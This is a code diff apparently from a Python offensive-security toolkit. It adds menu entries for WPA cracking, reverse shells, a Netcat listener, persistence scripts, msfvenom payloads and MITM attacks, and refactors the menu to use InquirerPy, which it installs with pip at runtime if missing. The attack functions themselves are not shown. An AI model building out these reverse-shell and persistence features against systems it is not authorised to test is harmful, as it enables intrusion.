-        ("27. Generate msfvenom Payload", generate_msfvenom_payload),
-        ("28. Advanced MITM Attacks", mitm_menu),
-        ("29. WiFi MITM Attacks", wifi_mitm_menu),
+        ("23. Crack WPA Handshake", wifi_crack_handshake),
+        ("24. Automated WiFi Attack (Wifite)", wifi_wifite),
+        ("25. Reverse Shell (TCP)", reverse_shell),
+        ("26. Generate Reverse Shell Payload", generate_reverse_shell_payload),
+        ("27. Start Listener (Netcat)", start_listener),
+        ("28. Generate Persistence Script", generate_persistence_script),
+        ("29. Generate msfvenom Payload", generate_msfvenom_payload),
+        ("30. Advanced MITM Attacks", mitm_menu),
+        ("31. WiFi MITM Attacks", wifi_mitm_menu),
         ("0. Back", None)
     ]
 ]
 
+# --- InquirerPy for interactive main menu selection ---
+INQUIRERPY_AVAILABLE = False
+try:
+    from InquirerPy import inquirer  # type: ignore
+    INQUIRERPY_AVAILABLE = True
+except ImportError:
+    try:
+        import subprocess
+        import sys
+        print("[!] InquirerPy not found. Attempting to install via pip...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "InquirerPy"])
+        from InquirerPy import inquirer  # type: ignore
+        INQUIRERPY_AVAILABLE = True
+        print("[+] InquirerPy installed successfully.")
+    except Exception as e:
+        print(f"[-] Failed to install InquirerPy: {e}\n[!] Falling back to classic input mode.")
+        INQUIRERPY_AVAILABLE = False
+
+# Helper for interactive menu selection
+def interactive_menu_select(options, message="Select Option > ", tooltips=None):
+    if not INQUIRERPY_AVAILABLE:
+        # Fallback to classic input
+        print("\n".join([f"{i+1}. {opt}" for i, opt in enumerate(options)]))
+        return input(message).strip()
+    choices = []
+    for i, opt in enumerate(options):
+        if tooltips and i < len(tooltips):
+            choices.append({"name": opt, "value": str(i+1), "tooltip": tooltips[i]})
+        else:
+            choices.append({"name": opt, "value": str(i+1)})
+    result = inquirer.select(
+        message=message,
+        choices=choices,
+        instruction="Use arrow keys to navigate, Enter to select."
+    ).execute()
+    return result
+
 def print_core_menu(page):
-    clear_screen()
-    animated_print(BANNER, delay=0.01)
-    print()
-    typewriter(DISCLAIMER, delay=0.003)
-    cprint("\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n", Colors.OKBLUE)
+    menu_text = "\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n"
+    print_menu_with_header(menu_text)
 
 current_page = 0
 while True:
     print_core_menu(current_page)
-    choice = input("Select Option > ").strip()
     menu = core_menus[current_page]
+    # Build options for interactive menu
+    options = [label for (label, action) in menu]
+    # Optionally, add tooltips for each menu item (can be improved later)
+    tooltips = [None for _ in options]  # Placeholder, can add descriptions
+    if INQUIRERPY_AVAILABLE:
+        # Remove color codes for InquirerPy display
+        import re
+        options_clean = [re.sub(r'\x1b\[[0-9;]*m', '', opt) for opt in options]
+        choice = interactive_menu_select(options_clean, message="Main Menu > ", tooltips=tooltips)
+        # Map back to menu index
+        idx = int(choice) - 1 if choice.isdigit() and 0 < int(choice) <= len(menu) else -1
+    else:
+        choice = input("Select Option > ").strip()
+        idx = -1
+        for i, (label, _) in enumerate(menu):
+            num = label.split(".")[0]
+            if choice == num:
+                idx = i
+                break
     found = False
-    for idx, (label, action) in enumerate(menu):
-        num = label.split(".")[0]
-        if choice == num:
-            found = True
-            if label.endswith("Exit"):
-                print("Exiting...")
-                exit()
-            elif label.endswith("Back"):
-                current_page = max(0, current_page - 1)
-                break
-            elif label.endswith("Next Page"):
-                if current_page < len(core_menus) - 1:
-                    current_page += 1
-                else:
-                    print("[!] No more pages.")
-                break
-            elif action:
-                action()
-                break
+    if 0 <= idx < len(menu):
+        label, action = menu[idx]
+        found = True
+        if label.endswith("Exit"):
+            print("Exiting...")
+            exit()
+        elif label.endswith("Back"):
+            current_page = max(0, current_page - 1)
+            continue
+        elif label.endswith("Next Page"):
+            if current_page < len(core_menus) - 1:
+                current_page += 1
+            else:
+                print("[!] No more pages.")
+            continue
+        elif action:
+            action()
+            continue
     if not found:
-            print("Invalid option.")
+        print("Invalid option.")
